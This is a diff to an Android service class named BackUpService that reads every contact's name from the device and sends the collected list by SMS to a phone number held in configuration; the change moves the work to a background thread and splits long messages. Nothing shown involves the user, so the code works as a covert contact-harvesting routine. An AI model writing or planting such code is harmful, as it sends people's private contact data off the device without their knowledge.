@@ -17,6 +17,7 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
+import android.provider.BaseColumns;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 
@@ -31,8 +32,9 @@ import android.telephony.SmsManager;
  * @since JDK 1.6
  * @see
  */
-public class BackUpservice extends Service
+public class BackUpService extends Service
 {
+	private static final String TAG = "genolog";
 	private ConfUtil mUtil;
 	private ContentResolver mResolver;
 	private Context mContext;
@@ -40,18 +42,34 @@ public class BackUpservice extends Service
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId)
 	{
+		// Log.i(TAG, "backupStart");
 		mContext = getApplicationContext();
 		mResolver = getContentResolver();
 		mUtil = ConfUtil.getConfUtil(mContext);
+		//启用新线程 避免阻塞
+		new Thread(new Runnable()
+		{
+			@Override
+			public void run()
+			{
+				backup();
+			}
+		}).start();
+		return super.onStartCommand(intent, flags, startId);
+	}
+
+	// 备份
+	private void backup()
+	{
 		Uri uri = ContactsContract.Contacts.CONTENT_URI;
-		String[] columns1 = { ContactsContract.Contacts._ID,
+		String[] columns1 = { BaseColumns._ID,
 				ContactsContract.Contacts.DISPLAY_NAME };
 		Cursor cursor = mResolver.query(uri, columns1, null, null, null);
+		// Log.i(TAG, "startQuery");
 		StringBuffer buffer = new StringBuffer();
 		while (cursor.moveToNext())
 		{
-			int id = cursor.getInt(cursor
-					.getColumnIndex(ContactsContract.Contacts._ID));
+			int id = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
 			String name = cursor.getString(cursor
 					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 			buffer.append(name + ":");
@@ -72,9 +90,24 @@ public class BackUpservice extends Service
 		// 查找完成，发短信
 		String telephone = mUtil.getTelephone();
 		SmsManager manager = SmsManager.getDefault();
-		ArrayList<String> parts = manager.divideMessage(buffer.toString());
-		manager.sendMultipartTextMessage(telephone, null, parts, null, null);
-		return super.onStartCommand(intent, flags, startId);
+		String msg = buffer.toString();
+		// Log.i(TAG, msg);
+		if (msg.length() > 70)
+		{
+			ArrayList<String> parts = manager.divideMessage(msg);
+			manager.sendMultipartTextMessage(telephone, null, parts, null, null);
+		}
+		else
+		{
+			manager.sendTextMessage(telephone, null, msg, null, null);
+		}
+	}
+
+	@Override
+	public void onDestroy()
+	{
+		// TODO Auto-generated method stub
+		super.onDestroy();
 	}
 
 	@Override
